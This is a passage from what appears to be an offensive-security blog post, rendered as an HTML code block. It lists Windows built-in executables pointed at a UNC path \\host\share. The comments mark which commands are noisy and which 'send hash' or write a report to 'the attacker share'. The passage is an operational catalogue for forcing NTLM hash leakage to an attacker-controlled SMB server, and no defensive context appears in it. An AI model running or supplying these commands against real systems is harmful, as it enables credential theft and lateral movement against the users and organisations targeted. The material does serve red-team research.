.exe \\host\share</span><br><span class="line">icacls.exe \\host\share</span><br><span class="line">LaunchWinApp.exe \\host\share <span class="comment">#(noisy, will pop an explorer window with the  contents of your SMB share.)</span></span><br><span class="line">licensingdiag.exe -cab \\host\share</span><br><span class="line">lodctr.exe \\host\share</span><br><span class="line">lpksetup.exe /p \\host\share /s</span><br><span class="line">makecab.exe \\host\share</span><br><span class="line">MdmDiagnosticsTool.exe -out \\host\share <span class="comment">#(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span></span><br><span class="line">mshta.exe \\host\share <span class="comment">#(noisy, pops an HTA window)</span></span><br><span class="line">msiexec.exe /update \\host\share /quiet</span><br><span class="line">msinfo32.exe \\host\share <span class="comment">#(noisy, pops a "cannot open" dialog)</span></span><br><span class="line">mspaint.exe \\host\share <span class="comment">#(noisy, invalid path to png error)</span></span><br><span class="line">mspaint.exe \\host\share\share.png <span class="comment">#(will capture hash, and display the remote PNG file to the user)</span></span><br><span class="line">msra.exe /openfile \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">mstsc.exe \\host\share <span class="comment">#(noisy, error)</span></span><br><span class="line">netcfg.exe -l \\host\share -c p -i foo</span><br></pre></td></tr></table></figure>
